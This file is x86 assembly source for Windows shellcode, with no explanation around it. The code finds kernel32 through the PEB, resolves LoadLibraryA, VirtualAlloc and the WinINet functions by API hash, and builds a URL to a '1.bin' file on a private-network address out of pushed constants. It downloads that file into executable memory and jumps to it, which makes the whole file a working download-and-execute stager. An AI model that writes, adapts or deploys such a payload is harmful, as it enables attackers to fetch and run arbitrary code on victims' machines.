.586

.MODEL FLAT, STDCALL

OPTION casemap:none

.DATA
myDword DWORD 12345678h;

.CODE
   start:
       mov ebp, esp                    ;
       add esp, 0fffff9f0H             ;
   find_kernel32:
       xor ecx,ecx                     ;
       ASSUME FS:NOTHING               ;
       mov esi,fs:[ecx+30h]            ;
       mov esi,[esi+0Ch]               ;
       mov esi,[esi+1Ch]               ;
   next_module:
       mov ebx, [esi+8h]               ;
       mov edi, [esi+20h]              ;
       mov esi, [esi]                  ;
       cmp [edi+12*2], cx              ;
       jne next_module                 ;
   find_function_shorten:
       jmp find_function_shorten_bnc   ;
   find_function_ret:
       pop esi                         ;
       mov [ebp+4H], esi             ;
       jmp resolve_symbols_kernel32    ;
   find_function_shorten_bnc:
       call find_function_ret          ;
   find_function:
       pushad                          ;
       mov eax, [ebx+3ch]             ;
       mov edi, [ebx+eax+78h]         ;
       add edi, ebx                    ;
       mov ecx, [edi+18h]             ;
       mov eax, [edi+20h]             ;
       add eax, ebx                    ;
       mov [ebp-4], eax                ;
   find_function_loop:
       jecxz find_function_finished    ;
       dec ecx                         ;
       mov eax, [ebp-4]                ;
       mov esi, [eax+ecx*4]            ;
       add esi, ebx                    ;
   compute_hash:
       xor eax, eax                    ;
       cdq                             ;
       cld                             ;
   compute_hash_again:
       lodsb                           ;
       test al, al                     ;
       jz compute_hash_finished        ;
       ror edx, 0dH                   ;
       add edx, eax                    ;
       jmp compute_hash_again          ;
   compute_hash_finished:
   find_function_compare:
       cmp edx, [esp+24H]             ;
       jnz find_function_loop          ;
       mov edx, [edi+24H]             ;
       add edx, ebx                    ;
       mov cx, [edx+2*ecx]             ;
       mov edx, [edi+1cH]             ;
       add edx, ebx                    ;
       mov eax, [edx+4*ecx]            ;
       add eax, ebx                    ;
       mov [esp+1cH], eax             ;
   find_function_finished:
       popad                           ;
       ret                             ;
   resolve_symbols_kernel32:
       push 78b5b983h
       call dword ptr [ebp+4h]       ;
       mov [ebp+10h], eax             ;Save TerminateProcess address for later

       push 0ec0e4e8eh
       call dword ptr [ebp+4h]       ;
       mov [ebp+14h], eax             ;Save LoadLibraryA address for later

       push 91AFCA54h;
       call dword ptr [ebp+04h];
       mov [ebp+20h], eax            ;Save VirtualAlloc address for later usage

    load_wininet:

        xor eax, eax;
        mov ax, 6c6ch;
        shl eax, 8h;
        mov al, 64h;
        push eax;
        push 2e74656eh;
        push 696e6977h;
        push esp;
        call dword ptr [ebp+14h];
        mov ebx, eax                   ;Move the base address of wininet.dll to EBX
        push 57E84429h                ;InternetOpenA API HASH
        call dword ptr [ebp+004h];
        mov [ebp+18h], eax            ;Save InternetOpenA address for later usage

        push 7E0FED49h                ;InternetOpenUrlA API HASH
        call dword ptr [ebp+04h];
        mov [ebp+1ch], eax            ;Save InternetOpenUrlA address for later usage

        push 5FE34B8Bh;
        call dword ptr [ebp+04h];
        mov [ebp+24h], eax            ;Save InternetReadFile address for later usage

        xor eax, eax;
        push eax;
        push eax;
        push eax;
        inc eax;
        push eax;
        dec eax;
        push eax;
        call dword ptr [ebp+18h];     Save InternetOpenA return para in EAX
        mov edi, eax;

        xor eax, eax;
        push eax;
        push 6e69622eh;
        push 312f3232h;
        push 322e3030h;
        push 322e3836h;
        push 312e3239h;
        push 312f2f3ah;
        push 70747468h;
        push esp;
        pop ecx;
        push eax;
        mov al, 40h;
        shl eax, 14h;
        push eax; eax == 4000000h
        xor eax, eax;
        push eax;
        push eax;
        push ecx;
        push edi;
        call dword ptr [ebp+1ch]; 
        mov edi, eax;        Save InternetOpenUrlA return para in EDI

        push 40h;
        xor eax, eax;
        mov al, 10h;
        shl eax, 8h;
        push eax; eax == 1000h
        shl eax, 8h;
        xor ebx, ebx;
        mov bl, 4h;
        mul ebx;
        push eax; eax == 400000h
        xor eax, eax;
        push eax;
        call dword ptr [ebp+20h];Save VirtualAlloc return para in ESI
        mov esi, eax;


        lea eax, dword ptr [ebp+28h];
        push eax;
        xor eax, eax;
        mov al, 40h;
        shl eax, 10h;
        push eax; eax == 400000h
        push esi;
        push edi;
        call dword ptr [ebp+24h];
        jmp esi;










end start